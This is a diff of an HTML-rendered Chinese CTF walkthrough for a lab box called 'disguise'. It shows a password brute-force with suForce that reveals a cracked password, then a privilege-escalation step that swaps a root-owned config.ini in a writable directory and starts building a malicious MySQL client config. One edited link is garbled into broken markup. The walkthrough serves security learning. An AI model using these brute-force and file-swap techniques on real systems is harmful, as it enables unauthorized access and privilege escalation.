@@ -1140,8 +1140,8 @@ www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
 <span class="pl-s">───────────────────────────────────</span>
 <span class="pl-s">🎯 Username | darksoul</span>
 <span class="pl-s">📖 Wordlist | pass</span>
-<span class="pl-s">🔎 Status   | 54031/389017/13%/Str0ngPassw0d1???  # 字典较大，这里我截取了爆破过程</span>
-<span class="pl-s">💥 Password | Str0ngPassw0d1???                  # 最终爆破出来的密码</span>
+<span class="pl-s">🔎 Status   | 54031/389017/13%/Str0ngPassw0d1??? </span>
+<span class="pl-s">💥 Password | Str0ngPassw0d1???                </span>
 <span class="pl-s">───────────────────────────────────</span></pre></div>
 <p>爆破成功，<code class="notranslate">darksoul</code> 的密码是 <code class="notranslate">Str0ngPassw0d1???</code><br>
 切换用户。</p>
@@ -1225,13 +1225,13 @@ darksoul@disguise:/tmp$ ./pspy64
 检查 <code class="notranslate">config.ini</code> 的权限。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ ls -la config.ini
 -rw-r--r-- 1 root root 114 Apr  2 04:03 config.ini</pre></div>
-<p>原 <code class="notranslate">config.ini</code> 是root所有，darksoul不可写。但是darksoul可以重命名（因为父目录<code class="notranslate">/home/darksoul</code>是darksoul可写的），然后创建一个同名文件。</p>
+<p>原 <code class="notranslate">config.ini</code> 是root所有，darksoul不可写。但是darksoul可以删除（因为父目录<code class="notranslate">/home/darksoul</code>是darksoul可写的），然后创建一个同名文件。</p>
 <p>我当时是把原来的 <code class="notranslate">config.ini</code> 备份成了 <code class="notranslate">config.ini.bak</code>，然后新建了一个 <code class="notranslate">config.ini</code>。</p>
 <div class="highlight highlight-source-shell"><pre class="notranslate">darksoul@disguise:<span class="pl-k">~</span>$ mv config.ini config.ini.bak <span class="pl-c"><span class="pl-c">#</span> 如果需要备份</span>
 darksoul@disguise:<span class="pl-k">~</span>$ touch config.ini
 darksoul@disguise:<span class="pl-k">~</span>$ ls -la config.ini
 -rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini</pre></div>
-<p>查了一下 <code class="notranslate">mysql-connector-python</code> 的 <code class="notranslate">read_default_file</code>，google找不到，<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w" rel="nofollow">wx公众号</a> 找到了。信息收集的终点是wx公众号（滑稽）。<br>
+<p>查了一下 <code class="notranslate">mysql-connector-python</code> 的 <code class="notranslate">exploit</code>，google找不到，[<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w" rel="nofollow">wx公众号</a>](<a href="https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)%E6%89%BE%E5%88%B0%E4%BA%86%E3%80%82%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%9A%84%E7%BB%88%E7%82%B9%E6%98%AFwx%E5%85%AC%E4%BC%97%E5%8F%B7%EF%BC%88%E6%BB%91%E7%A8%BD%EF%BC%89%E3%80%82" rel="nofollow">https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w)找到了。信息收集的终点是wx公众号（滑稽）。</a><br>
 <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/c76c2e33faf9f54e47d611f8d16b54e8237c80a47627ac116eb3208af921143c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363139313935383738352e77656270"><img src="https://camo.githubusercontent.com/c76c2e33faf9f54e47d611f8d16b54e8237c80a47627ac116eb3208af921143c/68747470733a2f2f377231554d50482e746f702f696d6167652f32303235303531363139313935383738352e77656270" alt="image-20250516191958461" data-canonical-src="https://7r1UMPH.top/image/20250516191958785.webp" style="max-width: 100%;"></a></p>
 <p>构造恶意的 <code class="notranslate">config.ini</code>：</p>
 <div class="highlight highlight-source-ini"><pre class="notranslate"><span class="pl-en">[client]</span>
